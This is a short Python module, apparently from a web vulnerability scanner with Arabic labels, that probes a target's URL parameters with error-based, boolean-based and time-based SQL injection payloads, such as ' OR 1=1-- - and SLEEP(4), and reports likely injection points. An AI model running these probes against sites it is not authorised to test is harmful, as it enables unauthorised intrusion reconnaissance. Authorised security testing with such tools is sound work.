# sqli.py — حقن SQL (خطأ/منطقي/زمني)
import re, time, urllib.parse
from core.registry import module
from core.helpers import norm_target, get_params
from core.http import get
from core.wordlists import COMMON_PARAMS, SQLI_ERR_RE

@module("sqli", "web", "حقن SQL")
def run(turl, a, R):
    base = norm_target(turl)
    params = get_params(turl) or COMMON_PARAMS
    t0 = time.time()
    get(base + "/" + ("?" + params[0] + "=1" if params else ""))
    base_t = max(time.time() - t0, 0.05)
    for p in params:
        for pay in ["'", "' OR 1=1-- -", "' OR 1=2-- -"]:
            st, _, b = get(f"{base}/?{p}={urllib.parse.quote(pay)}")
            if re.search(SQLI_ERR_RE, b, re.I):
                R.vuln(f"SQLi (خطأ) في {p}: {pay}")
        st1, _, b1 = get(f"{base}/?{p}={urllib.parse.quote('1 AND 1=1-- -')}")
        st2, _, b2 = get(f"{base}/?{p}={urllib.parse.quote('1 AND 1=2-- -')}")
        if st1 == st2 and len(b1) != len(b2) and len(b1) > 0:
            R.vuln(f"SQLi (منطقي) في {p}: {len(b1)} vs {len(b2)} بايت")
        for p2 in ["' AND SLEEP(4)-- -", "1 AND SLEEP(4)", "'; WAITFOR DELAY '0:0:4'-- -"]:
            t1 = time.time()
            get(f"{base}/?{p}={urllib.parse.quote(p2)}")
            dt = time.time() - t1
            if dt >= 3.5 and dt >= base_t * 3:
                R.vuln(f"SQLi (زمني) في {p}: تأخير {dt:.1f}s")
    R.info("اكتمل فحص SQLi")
